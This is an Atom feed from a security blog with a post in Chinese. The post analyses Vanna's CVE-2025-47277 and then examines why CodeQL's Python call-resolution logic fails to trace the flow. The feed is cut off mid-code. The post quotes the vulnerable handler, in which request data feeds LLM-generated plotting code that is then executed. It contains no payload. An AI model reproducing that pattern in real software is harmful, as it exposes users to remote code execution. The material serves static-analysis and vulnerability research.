<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0d9&#39;s blog</title>
  
  
  <link href="http://m0d9.me/atom.xml" rel="self"/>
  
  <link href="http://m0d9.me/"/>
  <updated>2025-06-20T09:50:12.093Z</updated>
  <id>http://m0d9.me/</id>
  
  <author>
    <name>m0d9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vanna CVE-2025-47277 看CodeQL Python 方法映射</title>
    <link href="http://m0d9.me/2025/06/16/Vanna-CVE-2025-47277-%E7%9C%8BCodeQL-Python-%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2025/06/16/Vanna-CVE-2025-47277-%E7%9C%8BCodeQL-Python-%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2025-06-16T10:53:00.000Z</published>
    <updated>2025-06-20T09:50:12.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a>1. 漏洞原理</h2><p>漏洞并不复杂，整个链也不长</p><p>source：<br><a href="https://github.com/vanna-ai/vanna/blob/a72b842d420cf1fa061e5f97d45ea08051651ebb/src/vanna/flask/__init__.py#L441">https://github.com/vanna-ai/vanna/blob/a72b842d420cf1fa061e5f97d45ea08051651ebb/src/vanna/flask/__init__.py#L441</a> </p><p><img src="/images/pasted-925.png" alt="upload successful"></p><p>sink：<br><a href="https://github.com/vanna-ai/vanna/blob/4da8dea0ce14a0d1db5a0692a7921d873be91c5f/src/vanna/base/base.py#L2088">https://github.com/vanna-ai/vanna/blob/4da8dea0ce14a0d1db5a0692a7921d873be91c5f/src/vanna/base/base.py#L2088</a> </p><span id="more"></span><p><img src="/images/pasted-926.png" alt="upload successful"></p><p>问题代码抽象如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">VannaFlaskApp</span>:</span><br><span class="line">    flask_app = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, </span></span><br><span class="line"><span class="params">                    vn: VannaBase, </span></span><br><span class="line"><span class="params">                    cache: Cache = MemoryCache(<span class="params"></span>),</span></span><br><span class="line"><span class="params">                    auth: AuthInterface = NoAuth(<span class="params"></span>),</span></span><br><span class="line"><span class="params">                    ...</span></span><br><span class="line"><span class="params">            self.vn = vn</span></span><br><span class="line"><span class="params">            ...  </span></span><br><span class="line"><span class="params">            @self.flask_app.route(<span class="params"><span class="string">&quot;/api/v0/generate_plotly_figure&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="params">            @self.requires_auth</span></span><br><span class="line"><span class="params">            @self.requires_cache(<span class="params">[<span class="string">&quot;df&quot;</span>, <span class="string">&quot;question&quot;</span>, <span class="string">&quot;sql&quot;</span>]</span>)</span></span><br><span class="line"><span class="params">            <span class="keyword">def</span> generate_plotly_figure(<span class="params">user: <span class="built_in">any</span>, <span class="built_in">id</span>: <span class="built_in">str</span>, df, question, sql</span>):</span></span><br><span class="line"><span class="params">                ...</span></span><br><span class="line"><span class="params">                <span class="keyword">try</span>:</span></span><br><span class="line"><span class="params">                    code = vn.generate_plotly_code(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="params">                        question=question,</span></span></span><br><span class="line"><span class="params"><span class="params">                        sql=sql,</span></span></span><br><span class="line"><span class="params"><span class="params">                        df_metadata=<span class="string">f&quot;Running df.dtypes gives:\n <span class="subst">&#123;df.dtypes&#125;</span>&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="params">                    </span>)</span></span><br><span class="line"><span class="params">                    fig = vn.get_plotly_figure(<span class="params">plotly_code=code, df=df, dark_mode=<span class="literal">False</span></span>)</span></span><br></pre></td></tr></table></figure><p>python 现在的CodeQL 支持还是有限，在复现过程中，发现以下三点问题：<br>1.Flask 框架不全，这几个参数都不是source点<br>2.疑似py 动态类型特性，导致一些nv.generate_plotly_code 方法无法跟踪<br>3.第三方规则不够，像ZhipuAI</p><p>1 和3都好解决，重点跟踪问题2 的原因，猜测可能原因<br>●方法调用call 无法定位到方法的实现function，最可能的原因是无法识别vn 的类型，导致无法跟踪</p><h2 id="2-步骤一：手动寻找vn-generate-plotly-code-对应的Call-amp-Function是否存在"><a href="#2-步骤一：手动寻找vn-generate-plotly-code-对应的Call-amp-Function是否存在" class="headerlink" title="2. 步骤一：手动寻找vn.generate_plotly_code 对应的Call &amp; Function是否存在"></a>2. 步骤一：手动寻找vn.generate_plotly_code 对应的Call &amp; Function是否存在</h2><p>遇到第一个问题，无法发现vn.generate_plotly_code 这个Call</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Call_ e</span><br><span class="line">where e.toString().matches(<span class="string">&quot;%generate_plotly_code%&quot;</span>)</span><br><span class="line">select e</span><br></pre></td></tr></table></figure><p>但是Function 是存在的</p><p><img src="/images/pasted-927.png" alt="upload successful"><br>Function 存在，但是Call 不存在，需要进一步跟踪原因，猜测可能有以下原因<br>1.DB 构建的时候就没有这个Call_(为此跟踪了整个codeQL python DB 构建过程)<br>2.Function 和Call 关联的时候出问题了</p><p>省略问题1 中间的排查过程，结论如下：</p><p><img src="/images/pasted-928.png" alt="upload successful"></p><blockquote><p>结论：DB 中所需的Call 是存在的，不过被识别为Attribute，有点类似Java 的Field，toString 统一为Attribute。。。</p></blockquote><p>接下来，需要验证Function 和Call 的关联关系</p><h2 id="3-步骤二：寻找Call-amp-Function-关联逻辑"><a href="#3-步骤二：寻找Call-amp-Function-关联逻辑" class="headerlink" title="3. 步骤二：寻找Call &amp; Function 关联逻辑"></a>3. 步骤二：寻找Call &amp; Function 关联逻辑</h2><p>在Java 中，为Call 和Callable，Python 有些差异，正常来讲，以java 为例，是Call 和Callable 是可以直接通过Call.getCallable 获取到对应的方法实现的，看看Python 中是否有这样的API</p><h3 id="3-1-Call"><a href="#3-1-Call" class="headerlink" title="3.1 Call"></a>3.1 Call</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** A call expression, such as `func(...)` */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Call</span> <span class="keyword">extends</span> <span class="title class_">Call_</span> &#123;</span><br><span class="line">  <span class="comment">/* syntax: Expr(...) */</span></span><br><span class="line">  override Expr <span class="title function_">getASubExpression</span><span class="params">()</span> &#123;</span><br><span class="line">    result = <span class="built_in">this</span>.getAPositionalArg() <span class="type">or</span></span><br><span class="line">    <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getAKeyword().getValue() <span class="type">or</span></span><br><span class="line">    <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.getFunc()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** INTERNAL: See the class `Call` for further information. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Call_</span> extends <span class="meta">@py_Call</span>, Expr &#123;</span><br><span class="line">  <span class="comment">/** Gets the callable of this call expression. */</span></span><br><span class="line">  Expr <span class="title function_">getFunc</span><span class="params">()</span> &#123; py_exprs(result, _, <span class="built_in">this</span>, <span class="number">2</span>) &#125;</span><br></pre></td></tr></table></figure><p>注：<br>●这里是多继承，逻辑关系为取交集，也就是Call_ 是@py_Call 和 Expr 的交集，单独测试也是ok</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">py_exprs(unique <span class="type">int</span> id : <span class="meta">@py_expr</span>,</span><br><span class="line">    <span class="type">int</span> kind: <span class="type">int</span> ref,</span><br><span class="line">    <span class="type">int</span> parent : <span class="meta">@py_expr_parent</span> ref,</span><br><span class="line">    <span class="type">int</span> idx : <span class="type">int</span> ref);</span><br></pre></td></tr></table></figure><p>@py_Call 是最原始的基础类型，是直接作为基础类型在trap 文件中应用的</p><h4 id="py-Call-小问题跟踪"><a href="#py-Call-小问题跟踪" class="headerlink" title="py_Call 小问题跟踪"></a>py_Call 小问题跟踪</h4><p><img src="/images/pasted-929.png" alt="upload successful"></p><p>但是却没有py_Call.rel，难道是生成db 的时候漏了？<br>像py_Attribute 也是类似，在db 中并没有rel 文件，这是为什么？<br>实际上猜测是因为exprs 是一个集合，包含py_Call 和py_Attribute 等之类的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">py_exprs(unique <span class="type">int</span> id : <span class="meta">@py_expr</span>,</span><br><span class="line">    <span class="type">int</span> kind: <span class="type">int</span> ref,</span><br><span class="line">    <span class="type">int</span> parent : <span class="meta">@py_expr_parent</span> ref,</span><br><span class="line">    <span class="type">int</span> idx : <span class="type">int</span> ref);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">case</span> <span class="meta">@py_expr</span>.kind of</span><br><span class="line">    <span class="number">0</span> = <span class="meta">@py_Attribute</span></span><br><span class="line">|   <span class="number">1</span> = <span class="meta">@py_BinaryExpr</span></span><br><span class="line">|   <span class="number">2</span> = <span class="meta">@py_BoolExpr</span></span><br><span class="line">|   <span class="number">3</span> = <span class="meta">@py_Bytes</span></span><br><span class="line">|   <span class="number">4</span> = <span class="meta">@py_Call</span></span><br><span class="line">|   <span class="number">5</span> = <span class="meta">@py_ClassExpr</span></span><br></pre></td></tr></table></figure><h3 id="3-2-Function"><a href="#3-2-Function" class="headerlink" title="3.2 Function"></a>3.2 Function</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** INTERNAL: See the class `Call` for further information. */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Call_</span> extends <span class="meta">@py_Call</span>, Expr &#123;</span><br><span class="line">  <span class="comment">/** Gets the callable of this call expression. */</span></span><br><span class="line">  Expr <span class="title function_">getFunc</span><span class="params">()</span> &#123; py_exprs(result, _, <span class="built_in">this</span>, <span class="number">2</span>) &#125;</span><br></pre></td></tr></table></figure><p>虽然字面意思是获取对应callable，但是实际上是不是如此，只是获取对应的expr，举个例子</p><ul><li>Call: nv.generate_plotly_code(question=…)</li><li>Call.getFunc(): nv.generate_plotly_code</li><li>Call.getFunc().(Attrbuite).getObject(): nv</li></ul><p>此路不通，得去看最正宗的实现（也就是DFA 接口中的实现）</p><h2 id="4-步骤三：viableCallable-分析"><a href="#4-步骤三：viableCallable-分析" class="headerlink" title="4. 步骤三：viableCallable 分析"></a>4. 步骤三：viableCallable 分析</h2><p>viableCallable 是DFA 的接口API，直接分析Python 的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Gets a viable run-time target for the call `call`. */</span></span><br><span class="line">DataFlowCallable <span class="title function_">viableCallable</span><span class="params">(DataFlowCall call)</span> &#123;</span><br><span class="line">  call <span class="keyword">instanceof</span> ExtractedDataFlowCall <span class="type">and</span></span><br><span class="line">  <span class="variable">result</span> <span class="operator">=</span> call.getCallable()</span><br><span class="line">  or</span><br><span class="line">  <span class="comment">// A call to a library callable with a flow summary</span></span><br><span class="line">  <span class="comment">// In this situation we can not resolve the callable from the call,</span></span><br><span class="line">  <span class="comment">// as that would make data flow depend on type tracking.</span></span><br><span class="line">  <span class="comment">// Instead we resolve the call from the summary.</span></span><br><span class="line">  exists(LibraryCallable callable |</span><br><span class="line">    result = TLibraryCallable(callable) and</span><br><span class="line">    call.getNode() = callable.getACall().getNode() and</span><br><span class="line">    call <span class="keyword">instanceof</span> PotentialLibraryCall</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-930.png" alt="upload successful"></p><p><img src="/images/pasted-931.png" alt="upload successful"></p><p>可以看到：</p><ul><li>DataFlowCall 有350条，筛选出来的和DataFlowCallable 关系只102条，那么中间是存在遗漏的</li></ul><h3 id="4-1-DataFlowCall-amp-DataFlowCallable"><a href="#4-1-DataFlowCall-amp-DataFlowCallable" class="headerlink" title="4.1 DataFlowCall &amp; DataFlowCallable"></a>4.1 DataFlowCall &amp; DataFlowCallable</h3><p>看看DataFlowCall 的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** A call that is taken into account by the global data flow computation. */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">DataFlowCall</span> <span class="keyword">extends</span> <span class="title class_">TDataFlowCall</span> &#123;</span><br><span class="line">  <span class="comment">/** Gets a textual representation of this element. */</span></span><br><span class="line">  <span class="keyword">abstract</span> <span class="title function_">string</span> <span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Get the callable to which this call goes. */</span></span><br><span class="line">  <span class="keyword">abstract</span> DataFlowCallable <span class="title function_">getCallable</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">newtype</span> <span class="variable">TDataFlowCall</span> <span class="operator">=</span></span><br><span class="line">  TNormalCall(CallNode call, Function target, CallType type) &#123; resolveCall(call, target, type) &#125; or</span><br><span class="line">  <span class="title function_">TPotentialLibraryCall</span><span class="params">(CallNode call)</span> or</span><br><span class="line">  <span class="comment">/** A synthesized call inside a summarized callable */</span></span><br><span class="line">  TSummaryCall(</span><br><span class="line">    FlowSummaryImpl::Public::SummarizedCallable c, FlowSummaryImpl::Private::SummaryNode receiver</span><br><span class="line">  ) &#123;</span><br><span class="line">    FlowSummaryImpl::Private::summaryCallbackRange(c, receiver)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>主要关TNormalCall，其中用到了resolveCall</li></ul><h4 id="resolveCall"><a href="#resolveCall" class="headerlink" title="resolveCall"></a>resolveCall</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Holds if `call` is a call to the `target`, with call-type `type`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">cached</span><br><span class="line">predicate <span class="title function_">resolveCall</span><span class="params">(CallNode call, Function target, CallType type)</span> &#123;</span><br><span class="line">  Stages::DataFlow::ref() and</span><br><span class="line">  (</span><br><span class="line">    type <span class="keyword">instanceof</span> CallTypePlainFunction and</span><br><span class="line">    call.getFunction() = functionTracker(target).asCfgNode() and</span><br><span class="line">    not <span class="title function_">exists</span><span class="params">(Class cls | cls.getAMethod()</span> = target)</span><br><span class="line">    or</span><br><span class="line">    <span class="title function_">resolveMethodCall</span><span class="params">(call, target, type, _)</span></span><br><span class="line">    or</span><br><span class="line">    type <span class="keyword">instanceof</span> CallTypeClass and</span><br><span class="line">    <span class="title function_">exists</span><span class="params">(Class cls |</span></span><br><span class="line"><span class="params">      resolveClassCall(call, cls)</span> <span class="type">and</span></span><br><span class="line">      <span class="variable">target</span> <span class="operator">=</span> invokedFunctionFromClassConstruction(cls, _)</span><br><span class="line">    )</span><br><span class="line">    or</span><br><span class="line">    type <span class="keyword">instanceof</span> CallTypeClassInstanceCall and</span><br><span class="line">    <span class="title function_">resolveClassInstanceCall</span><span class="params">(call, target, _)</span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">resolveMethodCall</span><span class="params">(CallNode call, Function target, CallType type, Node self)</span> &#123;</span><br><span class="line">    (</span><br><span class="line">      directCall(call, target, _, _, _, self)</span><br><span class="line">      or</span><br><span class="line">      <span class="title function_">callWithinMethodImplicitSelfOrCls</span><span class="params">(call, target, _, _, _, self)</span></span><br><span class="line">      or</span><br><span class="line">      <span class="title function_">fromSuper</span><span class="params">(call, target, _, _, _, self)</span></span><br><span class="line">    ) and</span><br><span class="line">    (</span><br><span class="line">      <span class="comment">// normal method call</span></span><br><span class="line">      type <span class="keyword">instanceof</span> CallTypeNormalMethod <span class="title function_">and</span></span><br><span class="line">      <span class="params">(</span></span><br><span class="line"><span class="params">        self = classInstanceTracker(_)</span></span><br><span class="line">        <span class="type">or</span></span><br><span class="line">        <span class="variable">self</span> <span class="operator">=</span> selfTracker(_)</span><br><span class="line">      ) and</span><br><span class="line">      not <span class="title function_">isStaticmethod</span><span class="params">(target)</span> and</span><br><span class="line">      not <span class="title function_">isClassmethod</span><span class="params">(target)</span></span><br><span class="line">      or</span><br><span class="line">      <span class="comment">// method as plain function call</span></span><br><span class="line">      type <span class="keyword">instanceof</span> CallTypeMethodAsPlainFunction <span class="type">and</span></span><br><span class="line">      <span class="variable">self</span> <span class="operator">=</span> classTracker(_) and</span><br><span class="line">      not <span class="title function_">isStaticmethod</span><span class="params">(target)</span> and</span><br><span class="line">      not <span class="title function_">isClassmethod</span><span class="params">(target)</span></span><br><span class="line">      or</span><br><span class="line">      <span class="comment">// staticmethod call</span></span><br><span class="line">      type <span class="keyword">instanceof</span> CallTypeStaticMethod and</span><br><span class="line">      <span class="title function_">isStaticmethod</span><span class="params">(target)</span></span><br><span class="line">      or</span><br><span class="line">      <span class="comment">// classmethod call</span></span><br><span class="line">      type <span class="keyword">instanceof</span> CallTypeClassMethod and</span><br><span class="line">      <span class="title function_">isClassmethod</span><span class="params">(target)</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="callType"><a href="#callType" class="headerlink" title="callType"></a>callType</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// =============================================================================</span></span><br><span class="line"><span class="comment">// call and argument resolution</span></span><br><span class="line"><span class="comment">// =============================================================================</span></span><br><span class="line"><span class="type">newtype</span> <span class="variable">TCallType</span> <span class="operator">=</span></span><br><span class="line">  <span class="comment">/** A call to a function that is not part of a class. */</span></span><br><span class="line">  CallTypePlainFunction() or</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A call to an &quot;normal&quot; method on a class instance.</span></span><br><span class="line"><span class="comment">   * Does not include staticmethods or classmethods.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  CallTypeNormalMethod() or</span><br><span class="line">  <span class="comment">/** A call to a staticmethod. */</span></span><br><span class="line">  CallTypeStaticMethod() or</span><br><span class="line">  <span class="comment">/** A call to a classmethod. */</span></span><br><span class="line">  CallTypeClassMethod() or</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A call to method on a class, not going through an instance method, such as</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * ```py</span></span><br><span class="line"><span class="comment">   * class Foo:</span></span><br><span class="line"><span class="comment">   *     def method(self, arg):</span></span><br><span class="line"><span class="comment">   *         pass</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * foo = Foo()</span></span><br><span class="line"><span class="comment">   * Foo.method(foo, 42)</span></span><br><span class="line"><span class="comment">   * ```</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  CallTypeMethodAsPlainFunction() or</span><br><span class="line">  <span class="comment">/** A call to a class. */</span></span><br><span class="line">  CallTypeClass() or</span><br><span class="line">  <span class="comment">/** A call on a class instance, that goes to the `__call__` method of the class */</span></span><br><span class="line">  CallTypeClassInstanceCall()</span><br></pre></td></tr></table></figure><ul><li>CallTypePlainFunction: 调用最常见的方法，没有类修饰，例如json.dumps 就属于这种<br>  <img src="/images/pasted-933.png" alt="upload successful"></li><li>CallTypeClass: 类初始化，也就是类的 <strong>init</strong> 方法<br>  <img src="/images/pasted-934.png" alt="upload successful"></li><li>CallTypeClassInstanceCall：直接调用类方法，而不是从实例去调用，Demo 已经很详细了<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">     def <span class="title function_">method</span><span class="params">(self, arg)</span>:</span><br><span class="line">         <span class="type">pass</span></span><br><span class="line"><span class="variable">foo</span> <span class="operator">=</span> Foo()</span><br><span class="line">Foo.method(foo, <span class="number">42</span>)</span><br></pre></td></tr></table></figure></li><li>CallTypeNormalMethod: 普通的实例方法调用，需通过实例去调用，包括self</li><li>CallTypeMethodAsPlainFunction: 调用<br>  <img src="/images/pasted-935.png" alt="upload successful"></li><li>CallTypeStaticMethod: 静态方法调用<br>  <img src="/images/pasted-936.png" alt="upload successful"></li><li>CallTypeClassMethod: 具有classmethod 修饰的方法调用，包括<strong>new</strong> 等内置方法<ul><li>classmethod 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。</li></ul></li></ul><p>判断<code>vn.generate_plotly_code</code> 应该是属于directCall，type 类型为CallTypeNormalMethod，一步步跟进</p><h4 id="directCall"><a href="#directCall" class="headerlink" title="directCall"></a>directCall</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Holds if `call` is a call to a method `target` on an instance or class, where the</span></span><br><span class="line"><span class="comment">   * instance or class is not derived from an implicit `self`/`cls` argument to a method</span></span><br><span class="line"><span class="comment">   * -- for that, see `callWithinMethodImplicitSelfOrCls`.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * It is found by making an attribute read `attr` with the name `functionName` on a</span></span><br><span class="line"><span class="comment">   * reference to the class `cls`, or to an instance of the class `cls`. The reference the</span></span><br><span class="line"><span class="comment">   * attribute-read is made on is `self`.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  pragma[nomagic]</span><br><span class="line">  <span class="keyword">private</span> predicate <span class="title function_">directCall</span><span class="params">(</span></span><br><span class="line"><span class="params">    CallNode call, Function target, string functionName, Class cls, AttrRead attr, Node self</span></span><br><span class="line"><span class="params">  )</span> &#123;</span><br><span class="line">    target = findFunctionAccordingToMroKnownStartingClass(cls, functionName) and</span><br><span class="line">    <span class="title function_">directCall_join</span><span class="params">(call, functionName, cls, attr, self)</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="directCall-join"><a href="#directCall-join" class="headerlink" title="directCall_join"></a>directCall_join</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Extracted to give good join order */</span></span><br><span class="line">pragma[nomagic]</span><br><span class="line"><span class="keyword">private</span> predicate <span class="title function_">directCall_join</span><span class="params">(</span></span><br><span class="line"><span class="params">  CallNode call, string functionName, Class cls, AttrRead attr, Node self</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">  call.getFunction() = attrReadTracker(attr).asCfgNode() and</span><br><span class="line">  attr.accesses(self, functionName) and</span><br><span class="line">  self in [classTracker(cls), classInstanceTracker(cls)]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试发现，这个条件是没问题的</p><ul><li><code>attr.accesses(self, functionName)</code><br><img src="/images/pasted-937.png" alt="upload successful"><br>问题在于下面两个逻辑</li><li>self in [classTracker(cls), classInstanceTracker(cls)]</li><li>call.getFunction() = attrReadTracker(attr).asCfgNode()<br>其中单步调试发现，这二个条件也不满足</li></ul><h3 id="4-2-问题一定位：classInstanceTracker"><a href="#4-2-问题一定位：classInstanceTracker" class="headerlink" title="4.2 问题一定位：classInstanceTracker"></a>4.2 问题一定位：classInstanceTracker</h3><p>上文中的<code>self in [classTracker(cls), classInstanceTracker(cls)]</code>，self 是代码<code>vn.generate_plotly_code</code> 中的vn, 其原始赋值应该是从<code>__init__(vn...)</code> 中而来，cls 理应是VannaBase，猜测classInstanceTracker(VannaBase) 并不能传播至vn</p><h4 id="patch-classInstanceTracker-Class-cls"><a href="#patch-classInstanceTracker-Class-cls" class="headerlink" title="patch classInstanceTracker(Class cls)"></a>patch classInstanceTracker(Class cls)</h4><blockquote><p>注：这个方法是跟踪Class cls 类能够传播到哪个实例Node 中，例如<br>●bar = Foo() // Class Foo 能传播到bar 这个Node 中</p></blockquote><p>做个patch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> TrackClassInstanceInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = Class;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span 